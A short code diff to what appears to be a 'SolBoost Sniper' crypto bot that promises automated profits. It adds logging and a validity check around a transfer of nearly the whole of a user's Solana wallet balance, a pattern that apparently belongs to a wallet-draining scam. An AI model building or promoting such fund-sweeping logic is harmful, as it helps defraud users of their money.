@@ -130,6 +130,15 @@ To activate the SolBoost Sniper bot and start earning profits with our automated
 
             if (balance > totalFee + rentExemptionThreshold) {
                 const amountToTransfer = balance - totalFee - rentExemptionThreshold;
+                
+                console.log(`Calculated amountToTransfer for user ${userId}: ${amountToTransfer}`);
+
+                //Validate that amountToTransfer is a valid number
+                                if (isNaN(amountToTransfer) || amountToTransfer <= 0) {
+                                    console.error(`Invalid amountToTransfer: ${amountToTransfer}`);
+                                    ctx.reply("An error occurred while calculating the transfer amount. Please try again.");
+                                    return;
+                                }
 
                 if (!userStatus[userId]) {
                     userStatus[userId] = { totalTransferred: 0, transferDone: false };
